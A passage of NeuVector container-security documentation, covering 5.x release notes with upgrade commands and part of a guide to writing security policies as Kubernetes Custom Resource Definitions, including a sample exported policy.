OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.  Bug Fixes​  Fix application slowness on GKE Container Optimized OS (COS) nodes when in Protect mode.SUSE Linux (SLES) 15.4 CVE not matching in scanner. With this fix, if the severity is provided in the feed, the vulnerability will be added to the database, even if the NVD record is missing. It is possible that the report includes vulnerabilities without CVE scores.  Other​  Enhance Admission Control CRD options in helm https://github.com/neuvector/neuvector-helm/pull/237.Add new enforcer environment variables to helm chart.  5.1.1 February, 2023​  Enhancements​  Add “package” as information to the syslog-event for a detected vulnerability.Add Enforcer environment variable ENF_NETPOLICY_PULL_INTERVAL - Value in seconds (recommended value 60) to reduce network traffic and resulting resource consumption by Enforcer due to policy updates/recalculations. (Note: this was an undocumented addition until August of 2023).   - name: ENF_NETPOLICY_PULL_INTERVAL value: &quot;60&quot; &lt;== regulate the pulling gap by 60 seconds   Bug Fixes​  Empty group deletion errors &quot;Object not found&quot;Traffic within the same container alerting/blockingUnexpected implicit violations for istio egress traffic with allow rule in placeWhen upgrading from NeuVector 4.x release, incorrect pod group membership causes unexpected policy violationOIDC authentication failed with ADFS when extra encoding characters appear in the requestHigh memory usage by dp creating and deleting podsUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552Various UI bugs fixed  Other​  Helm chart updated to enable replacement of certificate for internal communications  5.1.0 December, 2022​  Enhancements​  Centralized, multi-cluster scanning (CVE) database. The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates. This issue does not occur on new deployments.Remove license from configuration screen (no longer required).  5.0.6-s1 March, 2023​  Bug Fixes​  Update alpine packages to remediate CVEs in curl including CVE-2023-23914, CVE-2023-23915, and CVE-2023-23916  5.0.6 February, 2023​  Bug Fixes​  High memory usage in dpMsgConnectionHigh memory usage on dp process in enforcer if there are many learned policy rules with unmanaged workload (memory leak)tcpdump is unable to start successfully when sniffering a traffic on containerUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552  5.0.5 November, 2022​  Bug Fixes​  Upgrading to 5.0.x results in an error message about Manager, Controller, Enforcer running different versions.Enforcers experiencing go routine panic resulting in dp kill. WebUI does not reflect enforcer as online.Unexpected Process.Profile.Violation incident in NV.Protect group on which command on coreos.  5.0.4 October, 2022​  Security updates​  Update alpine to remove critical CVE-2022-40674 in the manager expat library, as well as other minor CVEs.  Enhancements​  Add support for Antrea CNI  Bug Fixes​  Fix unexpected process.profile.violation incident in the NV.Protect group.When SSL is disabled on manager UI access, user password is printed to the manager log.  5.0.3 September, 2022​  Enhancements​  Do not display the EULA after successful restart from persistent volume.Use the image filter in vulnerability profile setting to skip container scan results.Support scanner in GitHub actions at https://github.com/neuvector/neuvector-image-scan-action.Add Enforcer environment variables for disabling secrets scanning and running CIS benchmarks   env: - name: ENF_NO_SECRET_SCANS (available after v4.4.4) value: &quot;1&quot; - name: ENF_NO_AUTO_BENCHMARK (after v5.0.3) value: &quot;1&quot;   Bug Fixes​  Enforcer unable to start occasionally.Connection leak on multi-cluster federation environments.Compliance page not loading some times in Security Risks -&gt; Compliance  5.0.2 July 2022​  Enhancements​  Rancher hardened and SELinux clusters are supported.  Bug Fixes​  Agent process high cpu usage on k3s systems.AD LDAP groups not working properly after upgrade to 5.0.Enforcer keeps restating due to error=too many open files (rke2/cilium).Support log is unable to download successfully.  5.0.1 June 2022​  Enhancements​  Support vulnerability scan of openSUSE Leap OS (in scanner image).Scanner: implement wipe-out attributes during reconstructing image repo.Verify NeuVector deployment and support for SELinux enabled hosts. See below for details on interim patching until helm chart is updated.Distinguish between Feature Chart and Partner Charts in Rancher UI more prominently.+ Improve ingress annotation for nginx in Rancher helm chart. Add / update ingress.kubernetes.io/protocol: https to nginx.ingress.kubernetes.io/backend-protocol: &quot;HTTPS&quot;.Current OpenShift Operator supports passthrough routes for api and federation services. Additional Helm Value parameters are added to support edge and re-encrypt route termination types.  Bug Fixes​  AKS cluster could add unexpected key in admission control webhook.Enforcer is not becoming operational on k8s 1.24 cluster with 1.64 containerd runtime. Separately, enforcer sometimes fails to start.Any admin-role user(local user or SSO) who promotes a cluster to fed master should be automatically promoted to fedAdmin role.When sso using Rancher default admin into NeuVector on master cluster, the NeuVector login role is admin, not fedAdmin.Fix several goroutine crashes.Implicit violation from host IP not associated with node.ComplianceProfile does not show PCI tag.LDAP group mapping sometimes is not shown.Risk Review and Improvement tool will result in error message &quot;Failed to update system config: Request in wrong format&quot;.OKD 3.11 - Clusterrole error shows even if it exists.  CVE Remediations​  High CVE-2022-29458 cve found on ncurses package in all images.High CVE-2022-27778 and CVE-2022-27782 found on curl package in Updater image.  Details on SELinux Support​  NeuVector does not need any additional setting for SELinux enabled clusters to deploy and function. Tested deploying NeuVector on RHEL 8.5 based SELinux enabled RKE2 hardened cluster. Neuvector deployed successfully if PSP is enabled and patching Manager and Scanner deployment. The next chart release should fix the below issue.  Attached example for enabling psp from Rancher chart and given below the commands for patching Manager and Scanner deployment. The user ID in the patch command can be any number.  kubectl patch deploy -ncattle-neuvector-system neuvector-scanner-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}' kubectl patch deploy -ncattle-neuvector-system neuvector-manager-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}'   Example for enabling PSP:  [neuvector@localhost nv]$ getenforce Enforcing [neuvector@localhost nv]$ sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Memory protection checking: actual (secure) Max kernel policy version: 33 [neuvector@localhost nv]$ kk get psp Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+ NAME PRIV CAPS SELINUX RUNASUSER FSGROUP SUPGROUP READONLYROOTFS VOLUMES global-restricted-psp false RunAsAny MustRunAsNonRoot MustRunAs MustRunAs false configMap,emptyDir,projected,secret,downwardAPI,persistentVolumeClaim neuvector-binding-psp true SYS_ADMIN,NET_ADMIN,SYS_PTRACE,IPC_LOCK RunAsAny RunAsAny RunAsAny RunAsAny false * system-unrestricted-psp true * RunAsAny RunAsAny RunAsAny RunAsAny false * [neuvector@localhost nv]$ nvpo.sh NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES neuvector-controller-pod-54f69f7f9c-6h822 1/1 Running 0 5m51s 10.42.0.29 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-enforcer-pod-jz77b 1/1 Running 0 5m51s 10.42.0.30 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-manager-pod-588488bb78-p6vf9 1/1 Running 0 111s 10.42.0.32 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-scanner-pod-87474dcff-s8vgt 1/1 Running 0 114s 10.42.0.31 localhost.localdomain &lt;none&gt; &lt;none&gt;   5.0.0 General Availability (GA) Release May 2022​  Enhancements​  Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. This deployment pulls from the mirrored Rancher repository (e.g. rancher/mirrored-neuvector-controller:5.0.0) and deploys into the cattle-neuvector-system namespace. NOTE: Requires updated Rancher release 2.6.5 May 2022 or later, and only admin and cluster owner roles are supported at this time.Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy. Configure proxy in Settings -&gt; Configuration, and enable proxy when configuring federation connections.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.Support Microsoft Teams format for webhooks.Support AD/LDAP nested groups under mapped role group.Support clusterrolebindings or rolebindings with group info in IDP for Openshift.Allow network rules and admission control rules to be promoted to a Federated rule.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.Improve page loading times for large number of CVEs in Security Risks -&gt; VulnerabilitiesAllow user to switch mode when they select all groups in Policy -&gt; Groups menu. Warn if the Nodes group is also selected.Collapse compliance check items of the same name and make expandable.Enhance security of gRPC communications.Fixed: unable to get correct workload privileged info in rke2 setup.Fix issue with support of openSUSE Leap 15.3 (k8s/crio).  Other Updates​  Helm chart update appVersion to 5.0.0 and chart version to 2.2.0Removed serverless scanning feature/menu.Removed support for Jfrog Xray scan result integration (Artifactory registry scan is still supported).Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  ","version":"5.3","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.x (prior to 5.2.x)​","type":1,"pageTitle":"5.x Release Notes","url":"/releasenotes/5x#upgrading-from-neuvector-4x-to-5x-prior-to-52x","content":" note The instructions below apply to upgrades to 5.0.x and 5.1.x. For 5.2.x, service accounts and bindings have changed, and should be reviewed to plan upgrades.  For Helm users, update to NeuVector Helm chart 2.0.0 or later. If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new Admission, DLP and WAF clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io), e.g.  neuvector/manager:5.0.0neuvector/controller:5.0.0neuvector/enforcer:5.0.0neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and registry secret in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   Beta 1 version released April 2022​  Feature complete, including Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Tags for Enforcer, Manager, Controller: 5.0.0-b1 (e.g. neuvector/controller:5.0.0-b1)  Preview.3 version released March 2022​  important To update previous preview deployments for new CRD WAF, DLP and Admission control features, please update the CRD yaml and add new rbac/role bindings: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/latest/crd-k8s-1.19.yaml kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Enhancements​  Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet)CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. NOTE: Requires updated Rancher release (date/version TBD).Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.  Preview.2 version released Feb 2022​  Minor file and license changes in source, no features added.  Support for deployment on AWS ECS Deprecated​  Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  5.0 'Tech Preview' January 2022​  Enhancements​  First release of an unsupported, 'tech-preview' version of NeuVector 5.0 open source version.Add support for OWASP Top-10, WAF-like rules for detecting network attacks in headers or body. Includes support for CRD definitions of signatures and application to appropriate Groups.Removes Serverless scanning features.  Bug Fixes​  TBD  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty ","version":"5.3","tagName":"h3"},{"title":"CRD - Custom Resource Definitions","type":0,"sectionRef":"#","url":"/policy/usingcrd","content":"","keywords":"","version":"5.3"},{"title":"NeuVector CRD for Policy As Code​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#neuvector-crd-for-policy-as-code","content":" NeuVector custom resource definitions (CRDs) can be used by various teams to automatically define security policies in the NeuVector container security platform. Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.  ","version":"5.3","tagName":"h3"},{"title":"Generating a Sample NeuVector CRD​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#generating-a-sample-neuvector-crd","content":" The simplest way to see how the yaml file format looks for a NeuVector CRD is to export it from the NeuVector Console. After you have tested your application while NeuVector is in Discover mode learning the network, file, and process behavior, you can export the learned policy.  Go to the Policy -&gt; Groups menu and click on Export Group Policy from the upper right.    Then select the Groups that you wish to export, such as the three in the demo namespace above. Inspect the saved CRD yaml below to see how the NeuVector network, process, and file rules are expressed.  note In addition to the selected group(s), all 'linked' groups will also be exported. A linked group is any other group that a selected group will connect to or from as allowed by a network rule.  Sample Exported CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.nginx-pod.demo namespace: demo spec: egress: - selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo action: allow applications: - HTTP name: nv.node-pod.demo-egress-0 ports: any file: [] ingress: - selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo action: allow applications: - HTTP name: nv.nginx-pod.demo-ingress-0 ports: any process: - action: allow name: nginx path: /usr/sbin/nginx - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps target: selector: criteria: - key: service op: = value: nginx-pod.demo - key: domain op: = value: demo name: nv.nginx-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.node-pod.demo namespace: demo spec: egress: - selector: criteria: - key: address op: = value: google.com name: test action: allow applications: - SSL name: test-egress-1 ports: any - selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo action: allow applications: - Redis name: nv.redis-pod.demo-egress-2 ports: any - selector: criteria: - key: service op: = value: kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system action: allow applications: - DNS name: nv.kube-dns.kube-system-egress-3 ports: any file: [] ingress: [] process: - action: allow name: curl path: &quot;&quot; - action: allow name: node path: /usr/bin/nodejs - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps - action: allow name: sh path: /bin/dash - action: allow name: whoami path: /usr/bin/whoami target: selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo policymode: Protect - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.redis-pod.demo namespace: demo spec: egress: [] file: [] ingress: [] process: - action: allow name: pause path: /pause - action: allow name: redis-server path: /usr/local/bin/redis-server target: selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.kube-dns.kube-system namespace: kube-system spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.exploit.demo namespace: demo spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo policymode: Monitor kind: List metadata: null   For example:  This is a namespaced CRD, of NvSecurityRulenginx-pod.demo can talk to node-pod.demo over HTTP, and allowed processes are listednode-pod.demo can talk to redis-pod.demo using the Redis protocolThe policymode of the services are set to Monitor modenode-pod.demo is allowed to egress to google.com using SSLGroup names such as nv.node-pod.demo are referenced but not defined in the CRD, so are expected to already exist when deployed. See below for defining Groups.  ","version":"5.3","tagName":"h3"},{"title":"Policy Mode Configuration and Group Definition​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#policy-mode-configuration-and-group-definition","content":" Policy mode configuration and Group definition is supported within the CRD configuration yaml file. With policymode configured in the yaml configuration file, importing such file will set the target group to this value for the CRD import.  important The imported target policy mode is not allowed to be modified from the NeuVector console (Policy -&gt; Groups). For example, once the mode is set to Monitor, it can only be changed through CRD modification, not through the console.  note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Policy Mode Configuration Requirements​  Mode only applies to the configured Target groupThe target group configuration must have the format nv.SERVICE_NAME.DOMAIN. Example: nv.xxx.yyyxxx.yyy=SERVICEyyy=DOMAIN Supported values are Discover, Monitor, and ProtectThe target group must contain the key-value pair key: serviceA configured key: domain must match the service domain suffix with the configured service key-value pair  Policy Mode Configuration Yaml file Example   target: policymode: Protect selector: name: nv.xxx.yyy criteria: - key: service #1 of 2 Criteria must exist value: xxx.yyy op: &quot;=&quot; - key: domain #2 of 2 Criteria must exist value: yyy op: &quot;=&quot;   ","version":"5.3","tagName":"h3"},{"title":"CRD Policy Rules Syntax and Semantics​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/policy/usingcrd#crd-policy-rules-syntax-and-semantics","content":" Group Name  Avoid using names which start with fed., nv.ip., host:, or workload: which are reserved for federated groups or ip based services.You can use node, external, or containers as a group name. However, this will be the same as the reserved default group names, so a new group will not be created. Any group definition criteria in the CRD will be ignored, but the rules for the group will be processed. The new rules will be shown under the group name.Meets the criteria: ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$Must not begin with fed, workload, or nv.ipIf the name has the format as nv.xxx.yyy, then there must exist a matching service and domain definition, or the import validation will fail. Please refer to the above Policy Mode Configuration for details.If the group name to be imported already exists in the destination system, then the criteria must match between the imported CRD and the one in the destination system. If there are differences, the CRD import will be rejected.  Policy Name  Needs to be unique within a yaml file.Cannot be empty.  Ingress  Is the traffic inbound to the target.  Egress  Is the traffic leaving from the target.  Criteria  Must not be empty unless the name is nodes, external, or containersname - If the name has the service format nv.xxx.yyy, then refer to the above section Policy Mode Configuration section detailskey - The key conforms to the regular expression pattern ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$op (operation) string = &quot;=&quot;string = &quot;!=&quot;string = &quot;contains&quot;string = &quot;prefix&quot;string = &quot;regex&quot;string = &quot;!regex&quot; value - A string without limitationskey - Must not be emptyop - Operator If the operator is equal (=) or not-equal (!=), then its’ value must not be empty.If the operator is equal (=) or not-equal (!=) with a value (such as * or ?), then the value cannot have any regular expresssion format like ^$.Example:Key: serviceOp : =Value: ab?c*e^$ (this is incorrect) Action - Allow or denyApplications (supported values) 